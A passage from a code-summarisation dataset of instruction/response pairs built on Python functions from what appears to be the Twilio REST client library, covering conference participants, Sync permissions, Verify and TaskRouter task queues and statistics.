self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ParticipantInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            conference_sid=self._solution['conference_sid'],\n            call_sid=self._solution['call_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = ParticipantContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                conference_sid=self._solution['conference_sid'],\n                call_sid=self._solution['call_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the participant"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef update(self, muted=values.unset, hold=values.unset, hold_url=values.unset,\n               hold_method=values.unset, announce_url=values.unset,\n               announce_method=values.unset, wait_url=values.unset,\n               wait_method=values.unset, beep_on_exit=values.unset,\n               end_conference_on_exit=values.unset, coaching=values.unset,\n               call_sid_to_coach=values.unset):\n        \"\"\"\n        Update the ParticipantInstance\n\n        :param bool muted: Whether the participant should be muted\n        :param bool hold: Whether the participant should be on hold\n        :param unicode hold_url: The URL we call using the `hold_method` for  music that plays when the participant is on hold\n        :param unicode hold_method: The HTTP method we should use to call hold_url\n        :param unicode announce_url: The URL we call using the `announce_method` for an announcement to the participant\n        :param unicode announce_method: The HTTP method we should use to call announce_url\n        :param unicode wait_url: URL that hosts pre-conference hold music\n        :param unicode wait_method: The HTTP method we should use to call `wait_url`\n        :param bool beep_on_exit: Whether to play a notification beep to the conference when the participant exit\n        :param bool end_conference_on_exit: Whether to end the conference when the participant leaves\n        :param bool coaching: Indicates if the participant changed to coach\n        :param unicode call_sid_to_coach: The SID of the participant who is being `coached`\n\n        :returns: Updated ParticipantInstance\n        :rtype: twilio.rest.api.v2010.account.conference.participant.ParticipantInstance\n        \"\"\"\n        return self._proxy.update(\n            muted=muted,\n            hold=hold,\n            hold_url=hold_url,\n            hold_method=hold_method,\n            announce_url=announce_url,\n            announce_method=announce_method,\n            wait_url=wait_url,\n            wait_method=wait_method,\n            beep_on_exit=beep_on_exit,\n            end_conference_on_exit=end_conference_on_exit,\n            coaching=coaching,\n            call_sid_to_coach=call_sid_to_coach,\n        )", "response": "Update the ParticipantInstance s related properties"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get(self, identity):\n        return SyncMapPermissionContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            map_sid=self._solution['map_sid'],\n            identity=identity,\n        )", "response": "Constructs a SyncMapPermissionContext\n\n        :param identity: Identity of the user to whom the Sync Map Permission applies.\n\n        :returns: twilio.rest.sync.v1.service.sync_map.sync_map_permission.SyncMapPermissionContext\n        :rtype: twilio.rest.sync.v1.service.sync_map.sync_map_permission.SyncMapPermissionContext"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_instance(self, payload):\n        return SyncMapPermissionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            map_sid=self._solution['map_sid'],\n        )", "response": "Build an instance of SyncMapPermissionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nfetches a SyncMapPermissionInstance :returns: Fetched SyncMapPermissionInstance :rtype: twilio.rest.sync.v1.service.sync_map.sync_map_permission.SyncMapPermissionInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a SyncMapPermissionInstance\n\n        :returns: Fetched SyncMapPermissionInstance\n        :rtype: twilio.rest.sync.v1.service.sync_map.sync_map_permission.SyncMapPermissionInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return SyncMapPermissionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            map_sid=self._solution['map_sid'],\n            identity=self._solution['identity'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef update(self, read, write, manage):\n        data = values.of({'Read': read, 'Write': write, 'Manage': manage, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SyncMapPermissionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            map_sid=self._solution['map_sid'],\n            identity=self._solution['identity'],\n        )", "response": "Update the SyncMapPermissionInstance\n\n        :param bool read: Read access.\n        :param bool write: Write access.\n        :param bool manage: Manage access.\n\n        :returns: Updated SyncMapPermissionInstance\n        :rtype: twilio.rest.sync.v1.service.sync_map.sync_map_permission.SyncMapPermissionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: SyncMapPermissionContext for this SyncMapPermissionInstance\n        :rtype: twilio.rest.sync.v1.service.sync_map.sync_map_permission.SyncMapPermissionContext\n        \"\"\"\n        if self._context is None:\n            self._context = SyncMapPermissionContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                map_sid=self._solution['map_sid'],\n                identity=self._solution['identity'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates the SyncMapPermissionInstance with the specified parameters.", "response": "def update(self, read, write, manage):\n        \"\"\"\n        Update the SyncMapPermissionInstance\n\n        :param bool read: Read access.\n        :param bool write: Write access.\n        :param bool manage: Manage access.\n\n        :returns: Updated SyncMapPermissionInstance\n        :rtype: twilio.rest.sync.v1.service.sync_map.sync_map_permission.SyncMapPermissionInstance\n        \"\"\"\n        return self._proxy.update(read, write, manage, )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a new VerificationInstance", "response": "def create(self, to, channel, custom_message=values.unset,\n               send_digits=values.unset, locale=values.unset,\n               custom_code=values.unset, amount=values.unset, payee=values.unset):\n        \"\"\"\n        Create a new VerificationInstance\n\n        :param unicode to: The phone number to verify\n        :param unicode channel: The verification method to use\n        :param unicode custom_message: The text of a custom message to use for the verification\n        :param unicode send_digits: The digits to send after a phone call is answered\n        :param unicode locale: The local to use for the verification SMS or call\n        :param unicode custom_code: A pre-generated code\n        :param unicode amount: The amount of the associated PSD2 compliant transaction.\n        :param unicode payee: The payee of the associated PSD2 compliant transaction\n\n        :returns: Newly created VerificationInstance\n        :rtype: twilio.rest.verify.v2.service.verification.VerificationInstance\n        \"\"\"\n        data = values.of({\n            'To': to,\n            'Channel': channel,\n            'CustomMessage': custom_message,\n            'SendDigits': send_digits,\n            'Locale': locale,\n            'CustomCode': custom_code,\n            'Amount': amount,\n            'Payee': payee,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return VerificationInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get(self, sid):\n        return VerificationContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )", "response": "Constructs a VerificationContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.verify.v2.service.verification.VerificationContext\n        :rtype: twilio.rest.verify.v2.service.verification.VerificationContext"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_instance(self, payload):\n        return VerificationInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Build an instance of VerificationInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef update(self, status):\n        data = values.of({'Status': status, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return VerificationInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Update the VerificationInstance\n\n        :param VerificationInstance.Status status: The new status of the resource\n\n        :returns: Updated VerificationInstance\n        :rtype: twilio.rest.verify.v2.service.verification.VerificationInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ngenerate an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: VerificationContext for this VerificationInstance\n        :rtype: twilio.rest.verify.v2.service.verification.VerificationContext\n        \"\"\"\n        if self._context is None:\n            self._context = VerificationContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get(self, sid):\n        return CertificateContext(self._version, fleet_sid=self._solution['fleet_sid'], sid=sid, )", "response": "Constructs a CertificateContext\n\n        :param sid: A string that uniquely identifies the Certificate.\n\n        :returns: twilio.rest.preview.deployed_devices.fleet.certificate.CertificateContext\n        :rtype: twilio.rest.preview.deployed_devices.fleet.certificate.CertificateContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_instance(self, payload):\n        return CertificateInstance(self._version, payload, fleet_sid=self._solution['fleet_sid'], )", "response": "Build an instance of CertificateInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ngenerate an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: CertificateContext for this CertificateInstance\n        :rtype: twilio.rest.preview.deployed_devices.fleet.certificate.CertificateContext\n        \"\"\"\n        if self._context is None:\n            self._context = CertificateContext(\n                self._version,\n                fleet_sid=self._solution['fleet_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nbuild an instance of WorkspaceStatisticsInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of WorkspaceStatisticsInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workspace_statistics.WorkspaceStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.workspace_statistics.WorkspaceStatisticsInstance\n        \"\"\"\n        return WorkspaceStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _proxy(self):\n        if self._context is None:\n            self._context = WorkspaceStatisticsContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the resource we are interested in"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nconstruct a SyncListPermissionContext :param identity: Identity of the user to whom the Sync List Permission applies. :returns: twilio.rest.sync.v1.service.sync_list.sync_list_permission.SyncListPermissionContext :rtype: twilio.rest.sync.v1.service.sync_list.sync_list_permission.SyncListPermissionContext", "response": "def get(self, identity):\n        \"\"\"\n        Constructs a SyncListPermissionContext\n\n        :param identity: Identity of the user to whom the Sync List Permission applies.\n\n        :returns: twilio.rest.sync.v1.service.sync_list.sync_list_permission.SyncListPermissionContext\n        :rtype: twilio.rest.sync.v1.service.sync_list.sync_list_permission.SyncListPermissionContext\n        \"\"\"\n        return SyncListPermissionContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            list_sid=self._solution['list_sid'],\n            identity=identity,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_instance(self, payload):\n        return SyncListPermissionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            list_sid=self._solution['list_sid'],\n        )", "response": "Build an instance of SyncListPermissionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfetching a SyncListPermissionInstance :returns: Fetched SyncListPermissionInstance :rtype: twilio.rest.sync.v1.service.sync_list.sync_list_permission.SyncListPermissionInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a SyncListPermissionInstance\n\n        :returns: Fetched SyncListPermissionInstance\n        :rtype: twilio.rest.sync.v1.service.sync_list.sync_list_permission.SyncListPermissionInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return SyncListPermissionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            list_sid=self._solution['list_sid'],\n            identity=self._solution['identity'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, read, write, manage):\n        data = values.of({'Read': read, 'Write': write, 'Manage': manage, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SyncListPermissionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            list_sid=self._solution['list_sid'],\n            identity=self._solution['identity'],\n        )", "response": "Update the SyncListPermissionInstance\n\n        :param bool read: Read access.\n        :param bool write: Write access.\n        :param bool manage: Manage access.\n\n        :returns: Updated SyncListPermissionInstance\n        :rtype: twilio.rest.sync.v1.service.sync_list.sync_list_permission.SyncListPermissionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: SyncListPermissionContext for this SyncListPermissionInstance\n        :rtype: twilio.rest.sync.v1.service.sync_list.sync_list_permission.SyncListPermissionContext\n        \"\"\"\n        if self._context is None:\n            self._context = SyncListPermissionContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                list_sid=self._solution['list_sid'],\n                identity=self._solution['identity'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a list of TaskQueueInstance records from the Task Queue API.", "response": "def list(self, friendly_name=values.unset,\n             evaluate_worker_attributes=values.unset, worker_sid=values.unset,\n             limit=None, page_size=None):\n        \"\"\"\n        Lists TaskQueueInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode friendly_name: Filter by a human readable description of a TaskQueue\n        :param unicode evaluate_worker_attributes: Provide a Worker attributes expression, and this will return the list of TaskQueues that would distribute tasks to a worker with these attributes.\n        :param unicode worker_sid: The worker_sid\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueInstance]\n        \"\"\"\n        return list(self.stream(\n            friendly_name=friendly_name,\n            evaluate_worker_attributes=evaluate_worker_attributes,\n            worker_sid=worker_sid,\n            limit=limit,\n            page_size=page_size,\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nretrieves a single page of TaskQueueInstance records from the API. Request is executed immediately", "response": "def page(self, friendly_name=values.unset,\n             evaluate_worker_attributes=values.unset, worker_sid=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of TaskQueueInstance records from the API.\n        Request is executed immediately\n\n        :param unicode friendly_name: Filter by a human readable description of a TaskQueue\n        :param unicode evaluate_worker_attributes: Provide a Worker attributes expression, and this will return the list of TaskQueues that would distribute tasks to a worker with these attributes.\n        :param unicode worker_sid: The worker_sid\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of TaskQueueInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueuePage\n        \"\"\"\n        params = values.of({\n            'FriendlyName': friendly_name,\n            'EvaluateWorkerAttributes': evaluate_worker_attributes,\n            'WorkerSid': worker_sid,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return TaskQueuePage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a new TaskQueueInstance", "response": "def create(self, friendly_name, target_workers=values.unset,\n               max_reserved_workers=values.unset, task_order=values.unset,\n               reservation_activity_sid=values.unset,\n               assignment_activity_sid=values.unset):\n        \"\"\"\n        Create a new TaskQueueInstance\n\n        :param unicode friendly_name: Human readable description of this TaskQueue\n        :param unicode target_workers: A string describing the Worker selection criteria for any Tasks that enter this TaskQueue.\n        :param unicode max_reserved_workers: The maximum amount of workers to create reservations for the assignment of a task while in this queue.\n        :param TaskQueueInstance.TaskOrder task_order: TaskOrder will determine which order the Tasks will be assigned to Workers.\n        :param unicode reservation_activity_sid: ActivitySID to assign workers once a task is reserved for them\n        :param unicode assignment_activity_sid: ActivitySID to assign workers once a task is assigned for them\n\n        :returns: Newly created TaskQueueInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'TargetWorkers': target_workers,\n            'MaxReservedWorkers': max_reserved_workers,\n            'TaskOrder': task_order,\n            'ReservationActivitySid': reservation_activity_sid,\n            'AssignmentActivitySid': assignment_activity_sid,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return TaskQueueInstance(self._version, payload, workspace_sid=self._solution['workspace_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef statistics(self):\n        if self._statistics is None:\n            self._statistics = TaskQueuesStatisticsList(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n            )\n        return self._statistics", "response": "Access the statistics\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task_queue.task_queues_statistics.TaskQueuesStatisticsList\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queues_statistics.TaskQueuesStatisticsList"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconstructs a TaskQueueContext :param sid: The sid :returns: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueContext :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a TaskQueueContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueContext\n        \"\"\"\n        return TaskQueueContext(self._version, workspace_sid=self._solution['workspace_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_instance(self, payload):\n        return TaskQueueInstance(self._version, payload, workspace_sid=self._solution['workspace_sid'], )", "response": "Build an instance of TaskQueueInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfetch a TaskQueueInstance :returns: Fetched TaskQueueInstance :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a TaskQueueInstance\n\n        :returns: Fetched TaskQueueInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return TaskQueueInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\naccessing the statistics :returns: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_statistics.TaskQueueStatisticsList :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_statistics.TaskQueueStatisticsList", "response": "def statistics(self):\n        \"\"\"\n        Access the statistics\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_statistics.TaskQueueStatisticsList\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_statistics.TaskQueueStatisticsList\n        \"\"\"\n        if self._statistics is None:\n            self._statistics = TaskQueueStatisticsList(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                task_queue_sid=self._solution['sid'],\n            )\n        return self._statistics"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\naccesses the real_time_statistics :returns: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_real_time_statistics.TaskQueueRealTimeStatisticsList :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_real_time_statistics.TaskQueueRealTimeStatisticsList", "response": "def real_time_statistics(self):\n        \"\"\"\n        Access the real_time_statistics\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_real_time_statistics.TaskQueueRealTimeStatisticsList\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_real_time_statistics.TaskQueueRealTimeStatisticsList\n        \"\"\"\n        if self._real_time_statistics is None:\n            self._real_time_statistics = TaskQueueRealTimeStatisticsList(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                task_queue_sid=self._solution['sid'],\n            )\n        return self._real_time_statistics"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\naccesses the cumulative_statistics :returns: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_cumulative_statistics.TaskQueueCumulativeStatisticsList :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_cumulative_statistics.TaskQueueCumulativeStatisticsList", "response": "def cumulative_statistics(self):\n        \"\"\"\n        Access the cumulative_statistics\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_cumulative_statistics.TaskQueueCumulativeStatisticsList\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_cumulative_statistics.TaskQueueCumulativeStatisticsList\n        \"\"\"\n        if self._cumulative_statistics is None:\n            self._cumulative_statistics = TaskQueueCumulativeStatisticsList(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                task_queue_sid=self._solution['sid'],\n            )\n        return self._cumulative_statistics"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngenerating an instance context for the resource that is capable of performing various actions.", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: TaskQueueContext for this TaskQueueInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueContext\n        \"\"\"\n        if self._context is None:\n            self._context = TaskQueueContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating the TaskQueueInstance :param unicode friendly_name: Human readable description of this TaskQueue :param unicode target_workers: A string describing the Worker selection criteria for any Tasks that enter this TaskQueue. :param unicode reservation_activity_sid: ActivitySID that will be assigned to Workers when they are reserved for a task from this TaskQueue. :param unicode assignment_activity_sid: ActivitySID that will be assigned to Workers when they are assigned a task from this TaskQueue. :param unicode max_reserved_workers: The maximum amount of workers to create reservations for the assignment of a task while in this queue. :param TaskQueueInstance.TaskOrder task_order: TaskOrder will determine which order the Tasks will be assigned to Workers. :returns: Updated TaskQueueInstance :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueInstance", "response": "def update(self, friendly_name=values.unset, target_workers=values.unset,\n               reservation_activity_sid=values.unset,\n               assignment_activity_sid=values.unset,\n               max_reserved_workers=values.unset, task_order=values.unset):\n        \"\"\"\n        Update the TaskQueueInstance\n\n        :param unicode friendly_name: Human readable description of this TaskQueue\n        :param unicode target_workers: A string describing the Worker selection criteria for any Tasks that enter this TaskQueue.\n        :param unicode reservation_activity_sid: ActivitySID that will be assigned to Workers when they are reserved for a task from this TaskQueue.\n        :param unicode assignment_activity_sid: ActivitySID that will be assigned to Workers when they are assigned a task from this TaskQueue.\n        :param unicode max_reserved_workers: The maximum amount of workers to create reservations for the assignment of a task while in this queue.\n        :param TaskQueueInstance.TaskOrder task_order: TaskOrder will determine which order the Tasks will be assigned to Workers.\n\n        :returns: Updated TaskQueueInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            target_workers=target_workers,\n            reservation_activity_sid=reservation_activity_sid,\n            assignment_activity_sid=assignment_activity_sid,\n            max_reserved_workers=max_reserved_workers,\n            task_order=task_order,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef authorization_documents(self):\n        if self._authorization_documents is None:\n            self._authorization_documents = AuthorizationDocumentList(self)\n        return self._authorization_documents", "response": "Access the AuthorizationDocumentList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the HostedNumberOrderList Twilio Domain", "response": "def hosted_number_orders(self):\n        \"\"\"\n        :rtype: twilio.rest.preview.hosted_numbers.hosted_number_order.HostedNumberOrderList\n        \"\"\"\n        if self._hosted_number_orders is None:\n            self._hosted_number_orders = HostedNumberOrderList(self)\n        return self._hosted_number_orders"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_instance(self, payload):\n        return WorkersStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n        )", "response": "Build an instance of WorkersStatisticsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef fetch(self, minutes=values.unset, start_date=values.unset,\n              end_date=values.unset, task_queue_sid=values.unset,\n              task_queue_name=values.unset, friendly_name=values.unset,\n              task_channel=values.unset):\n        \"\"\"\n        Fetch a WorkersStatisticsInstance\n\n        :param unicode minutes: Filter cumulative statistics by up to 'x' minutes in the past.\n        :param datetime start_date: Filter cumulative statistics by a start date.\n        :param datetime end_date: Filter cumulative statistics by a end date.\n        :param unicode task_queue_sid: Filter the real-time and cumulative statistics based on Workers tied to a particular queue\n        :param unicode task_queue_name: Filter the real-time and cumulative statistics based on Workers tied to a particular queue\n        :param unicode friendly_name: The friendly_name\n        :param unicode task_channel: Filter cumulative statistics by TaskChannel.\n\n        :returns: Fetched WorkersStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_statistics.WorkersStatisticsInstance\n        \"\"\"\n        params = values.of({\n            'Minutes': minutes,\n            'StartDate': serialize.iso8601_datetime(start_date),\n            'EndDate': serialize.iso8601_datetime(end_date),\n            'TaskQueueSid': task_queue_sid,\n            'TaskQueueName': task_queue_name,\n            'FriendlyName': friendly_name,\n            'TaskChannel': task_channel,\n        })\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return WorkersStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n        )", "response": "Fetch a WorkersStatisticsInstance\n\n        :param unicode minutes: Filter cumulative statistics by up to 'x' minutes in the past.\n        :param datetime start_date: Filter cumulative statistics by a start date.\n        :param datetime end_date: Filter cumulative statistics by a end date.\n        :param unicode task_queue_sid: Filter the real-time and cumulative statistics based on Workers tied to a particular queue\n        :param unicode task_queue_name: Filter the real-time and cumulative statistics based on Workers tied to a particular queue\n        :param unicode friendly_name: The friendly_name\n        :param unicode task_channel: Filter cumulative statistics by TaskChannel.\n\n        :returns: Fetched WorkersStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_statistics.WorkersStatisticsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = WorkersStatisticsContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the availabe items"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nfetches a WorkersStatisticsInstance :param unicode minutes: Filter cumulative statistics by up to 'x' minutes in the past. :param datetime start_date: Filter cumulative statistics by a start date. :param datetime end_date: Filter cumulative statistics by a end date. :param unicode task_queue_sid: Filter the real-time and cumulative statistics based on Workers tied to a particular queue :param unicode task_queue_name: Filter the real-time and cumulative statistics based on Workers tied to a particular queue :param unicode friendly_name: The friendly_name :param unicode task_channel: Filter cumulative statistics by TaskChannel. :returns: Fetched WorkersStatisticsInstance :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_statistics.WorkersStatisticsInstance", "response": "def fetch(self, minutes=values.unset, start_date=values.unset,\n              end_date=values.unset, task_queue_sid=values.unset,\n              task_queue_name=values.unset, friendly_name=values.unset,\n              task_channel=values.unset):\n        \"\"\"\n        Fetch a WorkersStatisticsInstance\n\n        :param unicode minutes: Filter cumulative statistics by up to 'x' minutes in the past.\n        :param datetime start_date: Filter cumulative statistics by a start date.\n        :param datetime end_date: Filter cumulative statistics by a end date.\n        :param unicode task_queue_sid: Filter the real-time and cumulative statistics based on Workers tied to a particular queue\n        :param unicode task_queue_name: Filter the real-time and cumulative statistics based on Workers tied to a particular queue\n        :param unicode friendly_name: The friendly_name\n        :param unicode task_channel: Filter cumulative statistics by TaskChannel.\n\n        :returns: Fetched WorkersStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_statistics.WorkersStatisticsInstance\n        \"\"\"\n        return self._proxy.fetch(\n            minutes=minutes,\n            start_date=start_date,\n            end_date=end_date,\n            task_queue_sid=task_queue_sid,\n            task_queue_name=task_queue_name,\n            friendly_name=friendly_name,\n            task_channel=task_channel,\n        )"}
